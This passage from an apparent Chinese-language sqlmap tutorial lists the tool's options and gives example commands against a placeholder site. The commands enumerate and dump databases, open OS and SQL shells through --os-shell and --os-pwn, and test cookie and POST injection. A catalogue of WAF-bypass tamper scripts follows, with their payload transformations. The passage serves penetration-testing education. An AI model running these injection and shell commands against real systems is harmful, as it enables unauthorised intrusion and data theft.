class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">获取目标方式</span><br><span class="line">     -<span class="ruby">u          /<span class="regexp">/指定目标</span></span></span><br><span class="line"><span class="ruby">     -l        /<span class="regexp">/从burp或webscarab代理中获取日志</span></span></span><br><span class="line"><span class="ruby">     -m     /<span class="regexp">/ 从文本中获取多个目标扫描</span></span></span><br><span class="line"><span class="ruby">     -r      /<span class="regexp">/从文件中加载http请求</span></span></span><br><span class="line"><span class="ruby">     -g      /<span class="regexp">/处理google的搜索结果 inurl:\".php?id=1\"       --smart</span></span></span><br><span class="line"><span class="ruby">请求</span></span><br><span class="line"><span class="ruby">     --data     /<span class="regexp">/把数据以post方式提交</span></span></span><br><span class="line"><span class="ruby">     --param-del     /<span class="regexp">/当get或post的数据需要用其他字符分割时    --data="id=1;id=2" --param-del=";"</span></span></span><br><span class="line"><span class="ruby">     --cookie     /<span class="regexp">/http cookie头</span></span></span><br><span class="line"><span class="ruby">     --drop-set-cookie     /<span class="regexp">/拒绝cookie</span></span></span><br><span class="line"><span class="ruby">     --user-agent</span></span><br><span class="line"><span class="ruby">     --random-agent     /<span class="regexp">/修改user-agent参数</span></span></span><br><span class="line"><span class="ruby">     --referer      /<span class="regexp">/伪造referer</span></span></span><br><span class="line"><span class="ruby">     --headers      /<span class="regexp">/增加额外的http头</span></span></span><br><span class="line"><span class="ruby">     --auth-type,--auth-cred      /<span class="regexp">/http认证保护 --auth-type Basic(Basic、Digest、NTLM) --auth-cred "testuser:testpass"</span></span></span><br><span class="line"><span class="ruby">     --auth-cert     /<span class="regexp">/http协议的证书认证</span></span></span><br><span class="line"><span class="ruby">     --proxy     /<span class="regexp">/http代理</span></span></span><br><span class="line"><span class="ruby">     --proxy-cred</span></span><br><span class="line"><span class="ruby">     --ignore-proxy      /<span class="regexp">/拒绝使用本地局域网代理</span></span></span><br><span class="line"><span class="ruby">     --delay      /<span class="regexp">/设定两个请求件的延迟，默认0s</span></span></span><br><span class="line"><span class="ruby">     --timeout     /<span class="regexp">/请求超时判断，默认30s</span></span></span><br><span class="line"><span class="ruby">     --retries     /<span class="regexp">/当超时是，重试次数，默认3次</span></span></span><br><span class="line"><span class="ruby">     --randomize     /<span class="regexp">/使参数值随机改变，长度类型不变</span></span></span><br><span class="line"><span class="ruby">     --scope     /<span class="regexp">/使用正则过滤目标网址，例如：python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"</span></span></span><br><span class="line"><span class="ruby">     --safe-url,--safe-freq     /<span class="regexp">/避免过多错误请求被屏蔽</span></span></span><br><span class="line"><span class="ruby">     --skip-urlencode     /<span class="regexp">/关闭URL参数值编码</span></span></span><br><span class="line"><span class="ruby">     --eval     /<span class="regexp">/执行自定义的python代码</span></span></span><br><span class="line"><span class="ruby">注入</span></span><br><span class="line"><span class="ruby">     -p     /<span class="regexp">/设定想要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --skip     /<span class="regexp">/设定不要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --dbms      /<span class="regexp">/指定数据库</span></span></span><br><span class="line"><span class="ruby">     --os      /<span class="regexp">/指定数据库服务器的系统     </span></span></span><br><span class="line"><span class="ruby">     --invalid-bignum     /<span class="regexp">/指定无效的大数字， 默认情况下id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</span></span></span><br><span class="line"><span class="ruby">     --invalid-logical     /<span class="regexp">/指定无效的逻辑， 可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19</span></span></span><br><span class="line"><span class="ruby">     --tamper     /<span class="regexp">/修改注入的数据，查看 ./tamper</span><span class="regexp">/ 可用脚本</span></span></span><br><span class="line"><span class="ruby">探测</span></span><br><span class="line"><span class="ruby">     --level     /<span class="regexp">/探测等级</span></span></span><br><span class="line"><span class="ruby">     --risk      /<span class="regexp">/风险等级 ，在./xml</span><span class="regexp">/payloads.xml/</span>中</span></span><br><span class="line"><span class="ruby">     --string     /<span class="regexp">/页面比较， 用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在，添加字符串     </span></span></span><br><span class="line"><span class="ruby">     --regexp     /<span class="regexp">/页面比较，添加正则</span></span></span><br><span class="line"><span class="ruby">     --<span class="keyword">not</span>-string     /<span class="regexp">/页面比较， 用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串</span></span></span><br><span class="line"><span class="ruby">     --code     /<span class="regexp">/页面比较， 用户也可以提供真与假条件返回的HTTP状态码不一样来注入</span></span></span><br><span class="line"><span class="ruby">     --text-only     /<span class="regexp">/页面比较， 用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用，http响应体不同</span></span></span><br><span class="line"><span class="ruby">     --titles     /<span class="regexp">/页面比较，html的title标签中不同</span></span></span><br><span class="line"><span class="ruby">注入技术     </span></span><br><span class="line"><span class="ruby">     --technique     /<span class="regexp">/测试是否是注入，指定使用的探测技术，默认会测试所有的方式（B/</span>E/U/S/T）</span></span><br><span class="line"><span class="ruby">     --time-sec     /<span class="regexp">/设定延迟注入的时间，默认5s</span></span></span><br><span class="line"><span class="ruby">     --union-cols     /<span class="regexp">/设定union查询的字段数，默认1-10个字段数</span></span></span><br><span class="line"><span class="ruby">     --union-char     /<span class="regexp">/设定union查询使用的字符</span></span></span><br><span class="line"><span class="ruby">     --second-order     /<span class="regexp">/二阶sql注入， 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。 --second-order后面跟一个判断页面的URL地址。</span></span></span><br><span class="line"><span class="ruby">列数据</span></span><br><span class="line"><span class="ruby">     -b,--banner     /<span class="regexp">/标志，返回数据库的版本号</span></span></span><br><span class="line"><span class="ruby">     --current-db     /<span class="regexp">/返回当前链接的数据库</span></span></span><br><span class="line"><span class="ruby">     --is-dba     /<span class="regexp">/判断当前用户是否为管理</span></span></span><br><span class="line"><span class="ruby">     --users     /<span class="regexp">/列数据库管理用户</span></span></span><br><span class="line"><span class="ruby">     --passwords     /<span class="regexp">/列出用户和用户的hash，并尝试破解</span></span></span><br><span class="line"><span class="ruby">     --privileges     /<span class="regexp">/列出数据库管理员权限</span></span></span><br><span class="line"><span class="ruby">     --roles     /<span class="regexp">/勒出数据库管理员角色，仅适用于Oracle</span></span></span><br><span class="line"><span class="ruby">     --dbs     /<span class="regexp">/列出数据库系统的数据库</span></span></span><br><span class="line"><span class="ruby">     --tables     /<span class="regexp">/列举数据库表，--exclude-sysdbs指不包含了所有的系统数据库，-D指定数据库</span></span></span><br><span class="line"><span class="ruby">     --columns     /<span class="regexp">/列出指定数据库表中的字段和数据类型，-D 指定数据库，-T 指定表</span></span></span><br><span class="line"><span class="ruby">     --schema     /<span class="regexp">/列举数据库系统的架构， 包含所有的数据库，表和字段，以及各自的类型。 --exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</span></span></span><br><span class="line"><span class="ruby">     --count     /<span class="regexp">/获取表中数据个数</span></span></span><br><span class="line"><span class="ruby">     --dump      /<span class="regexp">/获取整个表的数据，-D-T指定要获取哪个库哪个表，--start,--stop,--first,--last</span></span></span><br><span class="line"><span class="ruby">     --dump-all     /<span class="regexp">/获取所有数据库表的内容， 加上--exclude-sysdbs只获取用户数据库的表，/</span>*脱裤啊*<span class="regexp">/</span></span></span><br><span class="line"><span class="ruby">     --search     /<span class="regexp">/搜索-C列名，-T表，-D数据库</span></span></span><br><span class="line"><span class="ruby">     --sql-query,--sql-shell     /<span class="regexp">/运行自定义sql语句</span></span></span><br><span class="line"><span class="ruby">爆破</span></span><br><span class="line"><span class="ruby">     --common-tables     /<span class="regexp">/暴力破解表名  </span></span></span><br><span class="line"><span class="ruby">     --common-columns     /<span class="regexp">/暴力破解列名</span></span></span><br><span class="line"><span class="ruby">用户自定义函数注入</span></span><br><span class="line"><span class="ruby">     --udf-inject,--shared-lib     </span></span><br><span class="line"><span class="ruby">系统文件操作</span></span><br><span class="line"><span class="ruby">     --file-read     /<span class="regexp">/从数据库服务器中读取文件</span></span></span><br><span class="line"><span class="ruby">     --file-write,--file-dest     /<span class="regexp">/把文件上传到数据库服务器中</span></span></span><br><span class="line"><span class="ruby">     --os-cmd,--os-shell     /<span class="regexp">/运行任意操作系统命令</span></span></span><br><span class="line"><span class="ruby">Meterpreter配合使用</span></span><br><span class="line"><span class="ruby">     --os-pwn --msf-path /software/metasploit</span></span><br><span class="line"><span class="ruby">     --os-smbrelay     /<span class="regexp">/通过smb攻击</span></span></span><br><span class="line"><span class="ruby">     --os-bof     /<span class="regexp">/通过溢出</span></span></span><br><span class="line"><span class="ruby">     --tmp-path</span></span><br><span class="line"><span class="ruby">     --priv-esc</span></span><br><span class="line"><span class="ruby">对Windows注册表操作</span></span><br><span class="line"><span class="ruby">     --reg-read     /<span class="regexp">/读取注册表</span></span></span><br><span class="line"><span class="ruby">     --reg-add     /<span class="regexp">/写入</span></span></span><br><span class="line"><span class="ruby">     --reg-del     /<span class="regexp">/删除</span></span></span><br><span class="line"><span class="ruby">     --reg-key,--reg-value,--reg-data,--reg-type     /<span class="regexp">/辅助选项</span></span></span><br><span class="line"><span class="ruby">常规参数</span></span><br><span class="line"><span class="ruby">     -s     /<span class="regexp">/从sqlit中读取session， sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数</span></span></span><br><span class="line"><span class="ruby">     -t     /<span class="regexp">/保存http日志，需要跟一个文本文件</span></span></span><br><span class="line"><span class="ruby">     --batch     /<span class="regexp">/非交互模式，使用默认值一直运行下去</span></span></span><br><span class="line"><span class="ruby">     --charset=     <span class="regexp">//</span>强制使用字符编码</span></span><br><span class="line"><span class="ruby">     --crawl=    <span class="regexp">//</span>爬行网站URL,后面跟深度，收集潜在的可能存在漏洞的链接</span></span><br><span class="line"><span class="ruby">     --csv-del=<span class="string">";"</span>     /<span class="regexp">/规定输出到csv中的分隔符，默认逗号</span></span></span><br><span class="line"><span class="ruby">     --dbms-cred     /<span class="regexp">/dbms身份验证 某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数。</span></span></span><br><span class="line"><span class="ruby">     --dump-format     /<span class="regexp">/定义dump数据的格式（ CSV，HTML，SQLITE ）</span></span></span><br><span class="line"><span class="ruby">     --eta     /<span class="regexp">/预估完成时间</span></span></span><br><span class="line"><span class="ruby">     --flush-session     /<span class="regexp">/刷新session文件</span></span></span><br><span class="line"><span class="ruby">     --forms     /<span class="regexp">/自动获取form表单测试</span></span></span><br><span class="line"><span class="ruby">     --fresh-queries     /<span class="regexp">/忽略在回话文件中存储的查询结果</span></span></span><br><span class="line"><span class="ruby">     --hex     /<span class="regexp">/使用DBMS的hex函数， 有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</span></span></span><br><span class="line"><span class="ruby">     --output-dir=    <span class="regexp">//</span>自定义输出的路径</span></span><br><span class="line"><span class="ruby">     --parse-errors     /<span class="regexp">/从响应中获取DBMS的错误信息</span></span></span><br><span class="line"><span class="ruby">其他参数缩写</span></span><br><span class="line"><span class="ruby">     -z     /<span class="regexp">/使用参数缩写，--batch --random-agent --ignore-proxy --technique=BEU -u，可以写成-z "bat,randoma,ign,tec=BEU" -u，还有--ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u，可以写成-z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u</span></span></span><br><span class="line"><span class="ruby">     --alert     /<span class="regexp">/成功注入时警告，</span></span></span><br><span class="line"><span class="ruby">     --answers=      <span class="regexp">//</span>设定会发的答案, 当sqlmap提出输入时，自动输入自己想要的答案可以使用此参数</span></span><br><span class="line"><span class="ruby">     --beep     /<span class="regexp">/发现sql注入时发出蜂鸣声</span></span></span><br><span class="line"><span class="ruby">     --check-waf     /<span class="regexp">/启发式检测WAF/</span>IPS/IDS保护， 使用一个不存在的参数来注入测试</span></span><br><span class="line"><span class="ruby">     --cleanup     /<span class="regexp">/清理sqlmap注入时产生的UDF(s)和表</span></span></span><br><span class="line"><span class="ruby">     --disable-coloring     /<span class="regexp">/禁止彩色输出</span></span></span><br><span class="line"><span class="ruby">     --gpage     /<span class="regexp">/使用指定的Google结果页面</span></span></span><br><span class="line"><span class="ruby">     --hpp     /<span class="regexp">/使用http参数污染， 可能会绕过WAF/</span>IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效</span></span><br><span class="line"><span class="ruby">     --identify-waf     /<span class="regexp">/测试WAF/</span>IPS/IDS保护</span></span><br><span class="line"><span class="ruby">     --mobile     /<span class="regexp">/模仿智能手机</span></span></span><br><span class="line"><span class="ruby">     --purgr-output     /<span class="regexp">/安全的删除output目录的文件</span></span></span><br><span class="line"><span class="ruby">     --smart     /<span class="regexp">/启发式判断注入， 对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入</span></span></span><br><span class="line"><span class="ruby">     --wizard     /<span class="regexp">/初级用户向导参数，可以一步一步教你如何输入针对目标注入</span></span></span><br></pre></td></tr></table></figure><h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> <span class="comment">//查是否有注入，一些基本信息</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dbs <span class="comment">//枚举数据库</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --tables -D 数据库名 <span class="comment">//表名枚举</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --<span class="attribute">columns</span> -D 数据库名 -T 数据库表名 //字段枚举</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dump -D 数据库名 -T 表名 -C <span class="string">"字段名1，字段名2，字段名3"</span> <span class="comment">//dump</span></span><br></pre></td></tr></table></figure><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>cookie注入常见有两种，一种是cookie中的值拼接成sql语句产生注入<br>另一种asp的cookie中转注入，原因是程序对提交数据获取方式是直接request(“c.s.t”)的方式.未指明使用request对象的具体方法进行获取。可以都接收get,post,cookie方式提交的数据，一般程序只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</p><p>这里对第二种进行简单判断是否存在cookie注入的可能，</p><ol><li>首先要访问正常的页面，即是：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp?id=1，等页面打开之后，我们将IE地址栏清空，然后写 上:<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1&quot;));</code> 这里的“id=”便是“test.asp?id=1”中的“id=”，“escape(“1”)”中的“1”是 “test.asp?id=1”中的“id=1”了，这两处要根据实际情`况来定义。之后按下回车网页中会弹出一个对话框。</li><li>更改好了cookie后，我们就要试下能不能正常访问了，在另外一个窗口中我们打开以下地址：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp? 既是将“id=1”去掉后的，然后看是否能正常访问。<br>如果可以正常显示，那么就是以request(“c.s.t”)方式获取数据的，一般只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</li><li>通过修改escape中的参数来判断是否存在注入，接下来和普通注入判断方式一样</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --level <span class="number">2</span> 枚举强度</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --cookie <span class="string">"id=1"</span></span><br></pre></td></tr></table></figure><h3 id="表单post"><a href="#表单post" class="headerlink" title="表单post"></a>表单post</h3><p>三种方式</p><ol><li><p>表单枚举<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --forms</code></p></li><li><p>指定post参数<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --data &quot;username=1&amp;passwd=1&quot;</code></p></li><li><p>抓包构造<br> <code>python sqlmap.py -r test.txt</code></p></li></ol><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p><p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h2 id="0x03-Tamper使用"><a href="#0x03-Tamper使用" class="headerlink" title="0x03 Tamper使用"></a>0x03 Tamper使用</h2><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p><p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p><p><strong>tamper WAF 绕过脚本列表注释</strong></p><ol><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li><li>appendnullbyte.py 在payload末尾添加空字符编码</li><li>base64encode.py 对给定的payload全部字符使用Base64编码</li><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li><li>lowercase.py 用小写值替换每个关键字字符</li><li>modsecurityversioned.py 用注释包围完整的查询</li><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li><li>multiplespaces.py 在SQL关键字周围添加多个空格</li><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li><li>overlongutf8.py 转换给定的payload当中的所有字符</li><li>percentage.py 在每个字符之前添加一个百分号</li><li>randomcase.py 随机转换每个关键字字符的大小写</li><li>randomcomments.py 向SQL关键字中插入随机注释</li><li>securesphere.py 添加经过特殊构造的字符串</li><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li><li>space2comment.py 用“/**/”替换空格符</li><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li><li>space2plus.py 用加号“+”替换空格符</li><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p><p><strong>ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</strong></p><p>使用方法： </p><pre><code>sqlmap.py XXXXX -tamper &quot;模块名&quot;</code></pre><p>各个 tamper 的作用 </p><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><p>apostrophemask.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload</code></pre><p>将单引号 url 编码，用于过滤了单引号的情况。</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1  to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></pre><p><strong>适用数据库：</strong>ALL</p><p>apostrophenullencode.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload</code></pre><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 to 1�&apos; AND �&apos;1�&apos;=�&apos;1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>appendnullbyte.py: </p><pre><code>return &quot;%s%%00&quot; % payload if payload else payload</code></pre><p>在你构造的payload后面加一个空字符</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1to1&apos; AND &apos;1&apos;=&apos;1[]</code></pre><p><strong>适用数据库：</strong>Access</p><p>base64encode.py: </p><pre><code>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</code></pre><p>这个看模块名也知道是 base64 编码</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 toMScgQU5EICcxJz0nMQ==</code></pre><p><strong>适用数据库：</strong>ALL</p><p>between.py: </p><p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><pre><code>1 AND A &gt; Bto1 AND A NOT BETWEEN 0 AND B1 AND A = Bto1 AND A BETWEEN B AND B</code></pre><p><strong>适用数据库：</strong>ALL</p><p>bluecoat.py: </p><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><pre><code>union select * from users where id = 1tounion%09select * from%09users where id like 1</code></pre><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><p>chardoubleencode.py: </p><p>用 url 编码两次你的 payload </p><pre><code>select * from usersto%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charencode.py: </p><p>用 url 编码一次你的 payload</p><pre><code>select * from usersto%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charunicodeencode.py： </p><p>用 unicode 编码 payload ，只编码非编码字符</p><pre><code>select * from usersto\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</code></pre><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><p>commalesslimit.py： </p><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><pre><code>limit 2,1tolimit 1 offset 2</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commalessmid.py： </p><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><pre><code>mid(version(), 1, 1)tomid(version() from 1 for 1)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commentbeforeparentheses.py： </p><pre><code>retVal = re.sub(r&quot;\b(\w+)(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)</code></pre><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><pre><code>union select group_concat(table_name)tounion select group_concat/**/(table_name)</code></pre><p><strong>适用数据库：</strong>ALL</p><p>concat2concatws.py： </p><pre><code>payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</code></pre><p>用于过滤了 concat 函数的情况</p><pre><code>concat(1,2)toconcat_ws(mid(char(0), 0, 0), 1, 2)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>equaltolike.py： </p><pre><code>retVal = re.sub(r&quot;\s=\s&quot;, &quot; LIKE &quot;, retVal)</code></pre><p>将等号用 like 代替，用于过滤了等号的情况</p><pre><code>select * from users where id=1toselect * from users where id like 1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>escapequotes.py： </p><pre><code>return payload.replace(&quot;&apos;&quot;, &quot;\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\&quot;&apos;)</code></pre><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><pre><code>1&apos; and 1=1--+to1\\&apos; and 1=1--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>greatest.py： </p><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><pre><code>1 and a&gt;bto1 and greatest(a,b+1)=a</code></pre><p>ALL</p><p>halfversionedmorekeywords.py： </p><p>在关键字前添加注释，用于过滤了关键字的情况</p><pre><code>union select 1,2to/*!0union/*!0select 1,2</code></pre><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><p>htmlencode.py： </p><pre><code>return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload</code></pre><p>从名字就知道是将 payload 进行 html 编码</p><pre><code>1&apos; and 1=1--+to&amp;#49;&amp;#39;&amp;#32;&amp;#97;&amp;#110;&amp;#100;&amp;#32;&amp;#49;&amp;#61;&amp;#49;&amp;#45;&amp;#45;&amp;#43;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>ifnull2ifisnull.py： </p><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 